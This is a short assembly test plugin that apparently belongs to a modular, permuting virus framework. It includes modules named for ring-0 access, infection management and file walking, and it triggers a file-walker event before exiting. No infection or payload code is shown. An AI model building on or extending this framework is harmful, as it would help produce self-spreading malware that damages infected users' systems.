   ; TEST
   ; ~~~~
   ; - used to debug single plugins

   include                 INCLUDE\consts.inc
   include                 pentry.inc
   include                 k32man.inc
   include                 rxio.inc
   include                 ring0.inc
   include                 badfile.inc
   include                 dpgn.inc
   include                 regscan.inc
   include                 unprot.inc
   include                 util.inc
   include                 effect.inc
   include                 maindst.inc
   include                 infmanx.inc
   include                 vxcw.inc
   include                 iodaemon.inc
   include                 msgbox.inc
   include                 explorer.inc
   include                 walker.inc

   include                 plugin.inc
                           PLUGIN_START    TEST, CODE32, PERMUTABLE

   handleevent:            hookevent EV_TEST_ENTRY, testmain
                           stc
                           retn

   testmain:
                           event   EV_WALKER_RUN

                           push    -1
                           callX   ExitProcess

                           PLUGIN_END
